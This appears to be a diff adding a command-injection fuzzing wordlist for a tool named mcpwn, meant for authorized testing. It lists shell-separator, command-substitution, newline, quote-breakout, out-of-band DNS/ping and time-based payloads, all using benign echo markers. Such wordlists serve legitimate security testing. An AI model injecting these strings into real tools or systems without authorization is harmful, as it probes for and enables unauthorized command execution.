@@ -1,0 +1,25 @@
+# mcpwn command-injection seed wordlist — for AUTHORIZED testing of your own tools.
+# One payload per line; '#' lines are comments. Feed into an argument (fuzzArgs)
+# that a tool passes to a shell/exec and observe whether the extra command runs.
+# Use a benign marker (echo) first; escalate only with explicit authorization.
+#
+# Shell metacharacter separators appended to an otherwise-valid value.
+value; echo mcpwn_cmdi_marker
+value && echo mcpwn_cmdi_marker
+value | echo mcpwn_cmdi_marker
+value || echo mcpwn_cmdi_marker
+value & echo mcpwn_cmdi_marker
+# Command substitution (both forms).
+value`echo mcpwn_cmdi_marker`
+value$(echo mcpwn_cmdi_marker)
+# Newline / CRLF injection into argument lists.
+value%0aecho mcpwn_cmdi_marker
+value%0d%0aecho mcpwn_cmdi_marker
+# Quote-breakout then inject.
+" ; echo mcpwn_cmdi_marker ; "
+' ; echo mcpwn_cmdi_marker ; '
+# Benign out-of-band probe (point the host at something you control).
+value; ping -c1 mcpwn.oob.example
+value; nslookup mcpwn.oob.example
+# Time-based blind probe.
+value; sleep 5
